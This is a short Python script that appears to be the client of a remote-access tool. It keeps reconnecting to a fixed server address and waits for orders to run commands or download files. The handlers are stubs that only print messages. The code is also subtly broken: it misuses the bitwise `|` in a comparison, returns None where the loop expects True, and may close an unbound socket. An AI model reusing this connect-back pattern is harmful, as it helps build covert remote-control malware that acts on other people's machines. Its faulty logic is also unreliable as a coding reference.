import core.connection.conn as conn
import core.connection.options as opt
import time


def select_option(conn, skt):
    user_input = conn.receive_data(skt)
    if user_input == "1":
        print("[+] Running Command")
    elif user_input == "2":
        print("[+] Download file")
    elif user_input == "exit" | user_input == "99" | user_input == "quit":
        print("[+] Exiting")
        return False
    else:
        print("[+] Invalid input")




if __name__ == "__main__":
    server_ip = "192.168.0.16"
    server_port = 8080
    keep_alive = True
    while keep_alive:
        try:

            print("[+] Trying to Connect with ", server_ip)
            skt = conn.ConnectWithServer(server_ip, server_port)

            loopControl = True
            while loopControl:
                loopControl = select_option(conn, skt)

        except ConnectionRefusedError:
            print("[-] Connection Refused by the Target Machine")

        except ConnectionError:
            print("[-] Connection Error")
        except KeyboardInterrupt:
            print("[-] Keyboard interrupt. Exiting")
            skt.close()
            keep_alive = False
        finally:
            print("[+] Exiting")
            time.sleep(10)
            skt.close()